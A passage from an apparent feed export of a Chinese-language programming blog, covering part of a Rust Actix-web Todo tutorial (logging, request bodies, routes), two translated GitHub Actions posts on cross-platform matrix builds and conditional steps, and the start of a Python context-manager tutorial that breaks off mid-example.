class="string">&quot;/todos/&#123;list_id&#125;&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(todo))</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行并获取结果：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:8000/todos/1</span></span><br><span class="line">&#123;&quot;id&quot;:1,&quot;title&quot;:&quot;List 1&quot;&#125;</span><br></pre></td></tr></table></figure><h2><span id="zeng-jia-ri-zhi-ji-lu">增加日志记录</span></h2><p>为了方便查看操作过程，可以增加日志记录，使用 <code>env_logger</code> 方便从环境变量中设置日志记录级别，<code>log</code> 用于记录不同级别日志，比如 <code>info</code>，<code>debug</code>。</p><p><code>Cargo.toml</code>：</p><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="attr">env_logger</span> = <span class="string">&quot;0.8&quot;</span></span><br><span class="line"><span class="attr">log</span>=<span class="string">&quot;0.4&quot;</span></span><br></pre></td></tr></table></figure><p>在 <code>.env</code> 中可以手动设置日志记录级别，比如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RUST_LOG=info</span><br></pre></td></tr></table></figure><p><code>main.rs</code>：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> actix_web::&#123;get, middleware, web, App, HttpServer, Responder&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> env_logger;</span><br><span class="line"><span class="keyword">use</span> log::info;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">     <span class="title function_ invoke__">dotenv</span>().<span class="title function_ invoke__">ok</span>();</span><br><span class="line">+    <span class="keyword">if</span> std::env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;RUST_LOG&quot;</span>).<span class="title function_ invoke__">is_err</span>() &#123;</span><br><span class="line">+        std::env::<span class="title function_ invoke__">set_var</span>(<span class="string">&quot;RUST_LOG&quot;</span>, <span class="string">&quot;actix_web=info&quot;</span>);</span><br><span class="line">+    &#125;</span><br><span class="line">+    env_logger::<span class="title function_ invoke__">init</span>();</span><br><span class="line">     <span class="keyword">let</span> <span class="variable">cfg</span> = crate::config::Config::<span class="title function_ invoke__">from_env</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">     <span class="keyword">let</span> <span class="variable">pool</span> = cfg.pg.<span class="title function_ invoke__">create_pool</span>(NoTls).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">+    info!(</span><br><span class="line">         <span class="string">&quot;Starting server at http://&#123;&#125;:&#123;&#125;&quot;</span>,</span><br><span class="line">         cfg.server.host, cfg.server.port</span><br><span class="line">     );</span><br><span class="line">     HttpServer::<span class="title function_ invoke__">new</span>(<span class="keyword">move</span> || &#123;</span><br><span class="line">         App::<span class="title function_ invoke__">new</span>()</span><br><span class="line">             .<span class="title function_ invoke__">data</span>(pool.<span class="title function_ invoke__">clone</span>())</span><br><span class="line">+            .<span class="title function_ invoke__">wrap</span>(middleware::Logger::<span class="title function_ invoke__">default</span>())</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行以查看日志</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">cargo run</span></span><br><span class="line">   Compiling todo-list v0.1.0 (/Users/qiwihui/rust/todo-list)</span><br><span class="line">    Finished dev [unoptimized + debuginfo] target(s) in 1m 19s</span><br><span class="line">     Running `target/debug/todo-list`</span><br><span class="line">[2020-10-23T06:43:18Z INFO  todo_list] Starting server at http://127.0.0.1:8000</span><br><span class="line">[2020-10-23T06:43:18Z INFO  actix_server::builder] Starting 4 workers</span><br><span class="line">[2020-10-23T06:43:18Z INFO  actix_server::builder] Starting &quot;actix-web-service-127.0.0.1:8000&quot; service on 127.0.0.1:8000</span><br><span class="line">[2020-10-23T06:45:04Z INFO  actix_web::middleware::logger] 127.0.0.1:63751 &quot;GET /todos HTTP/1.1&quot; 200 79 &quot;&quot; &quot;curl/7.64.1&quot; 0.016465</span><br></pre></td></tr></table></figure><h2><span id="ru-he-huo-qu-qing-qiu-ti">如何获取请求体</span></h2><p>首先，我们增加插入数据操作，sql 语句中的 <code>returning id, title</code> 用于返回插入成功的数据</p><p><code>db.rs</code>：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">create_todo</span>(client: &amp;Client, title: <span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;TodoList, Error&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">statement</span> = client</span><br><span class="line">        .<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;insert into todo_list (title) values ($1) returning id, title&quot;</span>)</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"></span><br><span class="line">    client</span><br><span class="line">        .<span class="title function_ invoke__">query</span>(&amp;statement, &amp;[&amp;title])</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Error creating todo list&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">iter</span>()</span><br><span class="line">        .<span class="title function_ invoke__">map</span>(|row| TodoList::<span class="title function_ invoke__">from_row_ref</span>(row).<span class="title function_ invoke__">unwrap</span>())</span><br><span class="line">        .collect::&lt;<span class="type">Vec</span>&lt;TodoList&gt;&gt;()</span><br><span class="line">        .<span class="title function_ invoke__">pop</span>()</span><br><span class="line">        .<span class="title function_ invoke__">ok_or</span>(Error::<span class="title function_ invoke__">new</span>(ErrorKind::Other, <span class="string">&quot;Error creating todo list&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加请求处理，<code>CreateTodoList</code> 用于序列化请求的数据：</p><p><code>handles.rs</code></p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#[derive(Deserialize)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">CreateTodoList</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> title: <span class="type">String</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">create_todo</span>(</span><br><span class="line">    info: web::Json&lt;CreateTodoList&gt;,</span><br><span class="line">    state: web::Data&lt;AppState&gt;,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">client</span>: Client = state</span><br><span class="line">        .pool</span><br><span class="line">        .<span class="title function_ invoke__">get</span>()</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Error connecting to the database&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">result</span> = db::<span class="title function_ invoke__">create_todo</span>(&amp;client, info.<span class="number">0</span>.title.<span class="title function_ invoke__">clone</span>()).<span class="keyword">await</span>;</span><br><span class="line">    <span class="keyword">match</span> result &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(todo) =&gt; HttpResponse::<span class="title function_ invoke__">Ok</span>().<span class="title function_ invoke__">json</span>(todo),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(_) =&gt; HttpResponse::<span class="title function_ invoke__">InternalServerError</span>().<span class="title function_ invoke__">into</span>(),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，<code>state: web::Data&lt;AppState&gt;</code> 将 原来的 pool 做了简单的封装，好处在于可以传入多个数据作为 <code>web::Data</code>。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// .. 省略</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">AppState</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> pool: Pool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_web::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="comment">// .. 省略</span></span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(<span class="keyword">move</span> || &#123;</span><br><span class="line">        App::<span class="title function_ invoke__">new</span>()</span><br><span class="line">            .<span class="title function_ invoke__">data</span>(AppState &#123; pool: pool.<span class="title function_ invoke__">clone</span>() &#125;)</span><br></pre></td></tr></table></figure><p>同时添加路由：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">App::<span class="title function_ invoke__">new</span>()</span><br><span class="line">  <span class="comment">// 省略</span></span><br><span class="line">  .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">post</span>().<span class="title function_ invoke__">to</span>(handlers::create_todo))</span><br></pre></td></tr></table></figure><p>完成后运行 <code>cargo run</code>，在使用 curl 进行请求时，注意添加 <code>-H &quot;Content-Type: application/json&quot;</code> 头部信息，否则无法处理。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -X POST 127.0.0.1:8000/todos -d <span class="string">&#x27;&#123;&quot;title&quot;: &quot;list 3&quot;&#125;&#x27;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span></span></span><br><span class="line">&#123;&quot;id&quot;:3,&quot;title&quot;:&quot;list 3&quot;&#125;</span><br></pre></td></tr></table></figure><h2><span id="qi-ta-cao-zuo">其他操作</span></h2><p>继续添加其他操作，如获取创建单个项，以及完成项目（<code>check_todo</code>）</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">get_items</span>(client: &amp;Client, list_id: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;TodoItem&gt;, Error&gt; &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">get_item</span>(client: &amp;Client, list_id: <span class="type">i32</span>, item_id: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;TodoItem, Error&gt; &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">create_item</span>(client: &amp;Client, list_id: <span class="type">i32</span>, title: <span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;TodoItem, Error&gt; &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">check_todo</span>(client: &amp;Client, list_id: <span class="type">i32</span>, item_id: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">bool</span>, Error&gt; &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以及对应的路由和请求处理：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos/&#123;list_id&#125;/items&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::items))</span><br><span class="line">.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos/&#123;list_id&#125;/items&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">post</span>().<span class="title function_ invoke__">to</span>(handlers::create_item))</span><br><span class="line">.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos/&#123;list_id&#125;/items/&#123;item_id&#125;&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::get_item))</span><br><span class="line">.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos/&#123;list_id&#125;/items/&#123;item_id&#125;&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">put</span>().<span class="title function_ invoke__">to</span>(handlers::check_todo))</span><br></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">items</span>(info: web::Path&lt;GetTodoList&gt;, state: web::Data&lt;AppState&gt;) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">create_item</span>(</span><br><span class="line">    todo: web::Path&lt;GetTodoList&gt;,</span><br><span class="line">    info: web::Json&lt;CreateTodoItem&gt;,</span><br><span class="line">    state: web::Data&lt;AppState&gt;,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">get_item</span>(info: web::Path&lt;GetTodoItem&gt;, state: web::Data&lt;AppState&gt;) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">check_todo</span>(</span><br><span class="line">    info: web::Path&lt;GetTodoItem&gt;,</span><br><span class="line">    state: web::Data&lt;AppState&gt;,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="xiao-jie">小结</span></h2><ol><li>获取路径参数</li><li>获取请求体</li><li>设置日志记录</li></ol><h2><span id="can-kao-wen-dang-he-xiang-mu">参考文档和项目</span></h2><ol><li><a href="https://www.youtube.com/watch?v=gQwA0g0NNSI">Creating a simple TODO service with Actix</a></li><li><a href="actix.rs">actix-web 官方文档</a></li><li><a href="https://github.com/actix/examples">官方 actix-web 示例</a></li></ol><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      用 Rust Actix-web 写一个 Todo 应用（二）── 请求获取和日志记录
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Rust" scheme="https://qiwihui.com/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第3天：跨平台构建</title>
    <link href="https://qiwihui.com/qiwihui-blog-86/"/>
    <id>https://qiwihui.com/qiwihui-blog-86/</id>
    <published>2022-08-13T01:54:25.620Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>GitHub Actions 的优点之一是它不仅支持在 Linux 主机上或在容器中运行构建。GitHub 当然提供了Linux虚拟机，但是它们也提供了<a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/virtual-environments-for-github-hosted-runners">运行 Windows 和 macOS</a> 的虚拟机。</p><p>macOS 虚拟环境尤其重要，因为即使作为开发人员，也不能在虚拟机上运行 macOS，除非你在 Apple 硬件上运行它。因此，如果你要构建跨平台应用程序，则可能会限制你在本地构建和测试自己的应用程序的方式。</p><span id="more"></span><p>要指定主机类型，请使用作业的 <code>runs-on</code> 参数进行指示。 例如，<code>runs-on: macos-latest</code> 将在 macOS 上运行，<code>runs-on: windows-latest</code> 将毫不奇怪在 Windows 上运行。 因此，如果要通过在 Linux，macOS 和 Windows 三个平台上运行 <code>make</code> 来构建应用程序：，则可以将每个平台指定为一个单独的作业。 这是一个<a href="https://gist.github.com/ethomson/54e3832bcb391edb752169b370716854">例子</a>：</p><script src="https://gist.github.com/ethomson/54e3832bcb391edb752169b370716854.js"></script><p>但这重复了很多……如果你阅读了昨天有关 <a href="https://qiwihui.com/qiwihui-blog-85/">矩阵工作流</a> 的文章，你可能还记得我说过矩阵扩展实际上只是简单的变量替换。好吧，即使在运行参数中也是如此。</p><p>这意味着你可以使用矩阵来建立跨平台构建，其中只需几行<a href="https://gist.github.com/ethomson/ee209ef3bad14996d43d0ccf22563bd1">工作流定义</a>即可：</p><script src="https://gist.github.com/ethomson/ee209ef3bad14996d43d0ccf22563bd1.js"></script><p>因此，你可以选择：可以使用要在其上运行的虚拟环境指定每个单独的作业，或者，如果有共同的步骤，则可以使用矩阵来运行。</p><p>原文链接：<a href="https://www.edwardthomson.com/blog/github_actions_3_crossplatform_builds.html">https://www.edwardthomson.com/blog/github_actions_3_crossplatform_builds.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第3天：跨平台构建
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第13天：条件</title>
    <link href="https://qiwihui.com/qiwihui-blog-96/"/>
    <id>https://qiwihui.com/qiwihui-blog-96/</id>
    <published>2022-08-13T01:54:25.620Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>昨天我们看到，当你运行工作流程时，有许多可用数据。你可以在run步骤中使用这些数据，并将其与构建脚本，部署步骤或存储库自动化一起使用。但是你也可以在工作流本身中使用它。</p><p>利用这些数据的一种有用方法是<a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/workflow-syntax-for-github-actions#jobsjob_idif">有条件地使用它来运行工作流步骤</a>。</p><p>例如，你可能想在执行步骤之前检查工作流在其中运行的存储库的名称。如果你正在开发一个开源项目，这将很有帮助──因为fork你的存储库的人拥有<a href="https://qiwihui.com/qiwihui-blog-94/">具有不同权限的令牌</a>，因此你可以跳过fork的发布步骤。</p><span id="more"></span><p>这使fork的存储库仍可以执行连续的集成构建，并确保在运行构建和测试通过时工作流成功，并且不会由于发布步骤上的权限问题而失败。</p><p>你可以设置一个条件，以确保你位于正确的存储库上并在CI构建中运行（来自push事件）。</p><script src="https://gist.github.com/ethomson/9befd0258967e0a3006295b149792c84.js"></script><p>现在，当此工作流在fork中运行时，将跳过“发布文档”步骤。</p><p><img src="https://user-images.githubusercontent.com/3297411/77768483-81418880-707d-11ea-8e35-d932d5d032cf.png" alt="image"></p><p>使用条件语句使你可以构建可在分支或分支之间共享的高级工作流，但其中某些步骤是针对特定触发器或环境量身定制的。</p><p>原文链接：<a href="https://www.edwardthomson.com/blog/github_actions_13_conditionals.html">https://www.edwardthomson.com/blog/github_actions_13_conditionals.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第13天：条件
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>21. 上下文管理器 — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-132/"/>
    <id>https://qiwihui.com/qiwihui-blog-132/</id>
    <published>2022-08-13T01:54:25.610Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>上下文管理器是资源管理的绝佳工具。 它们使你可以在需要时精确地分配和释放资源。 一个著名的例子是 <code>with open()</code> 语句：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;notes.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;some todo...&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这将打开一个文件，并确保在程序执行离开with语句的上下文之后自动将其关闭。 它还处理异常，并确保即使在发生异常的情况下也能正确关闭文件。 在内部，上面的代码翻译成这样的东西：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;notes.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f.write(<span class="string">&#x27;some todo...&#x27;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure><p>我们可以看到，使用上下文管理器和 <code>with</code> 语句更短，更简洁。</p><span id="more"></span><h3><span id="shang-xia-wen-guan-li-qi-shi-li">上下文管理器示例</span></h3><ul><li>打开和关闭文件</li><li>打开和关闭数据库连接</li><li>获取和释放锁：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock</span><br><span class="line">lock = Lock()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 容易出错:</span></span><br><span class="line">lock.acquire()</span><br><span class="line"><span class="comment"># 做一些操作</span></span><br><span class="line"><span class="comment"># 锁应始终释放！</span></span><br><span class="line">lock.release()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更好：</span></span><br><span class="line"><span class="keyword">with</span> lock:</span><br><span class="line">    <span class="comment"># 做一些操作</span></span><br></pre></td></tr></table></figure><h3><span id="jiang-shang-xia-wen-guan-li-qi-shi-xian-wei-lei">将上下文管理器实现为类</span></h3><p>为了支持我们自己的类的 <code>with</code> 语句，我们必须实现 <code>__enter__</code> 和 <code>__exit__</code> 方法。 当执行进入 <code>with</code> 语句的上下文时，Python调用 <code>__enter__</code>。 在这里，应该获取资源并将其返回。 当执行再次离开上下文时，将调用 <code>__exit__</code> 并释放资源。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ManagedFile</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, filename</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;init&#x27;</span>, filename)</span><br><span class="line">        self.filename = filename</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__enter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;enter&#x27;</span>)</span><br><span class="line">        self.file = <span class="built_in">open</span>(self.filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__exit__</span>(<span class="params">self, exc_type, exc_value, exc_traceback</span>):</span><br><span class="line">        <span class="keyword">if</span> self.file:</span><br><span class="line">            self.file.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> ManagedFile(<span class="string">&#x27;notes.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;doing stuff...&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;some todo...&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">init notes.txt</span><br><span class="line">enter</span><br><span class="line">doing stuff...</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><h3><span id="chu-li-yi-chang">处理异常</span></h3><p>如果发生异常，Python将类型，值和回溯传递给 <code>__exit__</code> 方法。 它可以在这里处理异常。 如果 <code>__exit__</code> 方法返回的不是 <code>True</code>，则 <code>with</code> 语句将引发异常。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ManagedFile</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, filename</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;init&#x27;</span>, filename)</span><br><span class="line">        self.filename = filename</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__enter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;enter&#x27;</span>)</span><br><span class="line">        self.file = <span class="built_in">open</span>(self.filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__exit__</span>(<span class="params">self, exc_type, exc_value, exc_traceback</span>):</span><br><span class="line">        <span class="keyword">if</span> self.file:</span><br><span class="line">            self.file.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;exc:&#x27;</span>, exc_type, exc_value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 没有异常</span></span><br><span class="line"><span class="keyword">with</span> ManagedFile(<span class="string">&#x27;notes.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;doing stuff...&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;some todo...&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;continuing...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 异常触发，但是文件仍然能被关闭</span></span><br><span class="line"><span class="keyword">with</span> ManagedFile(<span class="string">&#x27;notes2.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;doing stuff...&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;some todo...&#x27;</span>)</span><br><span class="line">    f.do_something()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;continuing...&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">init notes.txt</span><br><span class="line">enter</span><br><span class="line">doing stuff...</span><br><span class="line">exc: <span class="literal">None</span> <span class="literal">None</span></span><br><span class="line">exit</span><br><span class="line">continuing...</span><br><span class="line"></span><br><span class="line">init notes2.txt</span><br><span class="line">enter</span><br><span class="line">doing stuff...</span><br><span class="line">exc: &lt;<span class="keyword">class</span> <span class="string">&#x27;AttributeError&#x27;</span>&gt; <span class="string">&#x27;_io.TextIOWrapper&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;do_something&#x27;</span></span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">AttributeError                            Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">24</span>-ed1604efb530&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">     <span class="number">27</span>     <span class="built_in">print</span>(<span class="string">&#x27;doing stuff...&#x27;</span>)</span><br><span class="line">     <span class="number">28</span>     f.write(<span class="string">&#x27;some todo...&#x27;</span>)</span><br><span class="line">---&gt; <span class="number">29</span>     f.do_something()</span><br><span class="line">     <span class="number">30</span> <span class="built_in">print</span>(<span class="string">&#x27;continuing...&#x27;</span>)</span><br><span class="line">AttributeError: <span class="string">&#x27;_io.TextIOWrapper&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;do_something&#x27;</span></span><br></pre></td></tr></table></figure><p>我们可以在 <code>__exit__</code> 方法中处理异常并返回 <code>True</code>。</p><figure class="highlight python"><table><tr><td 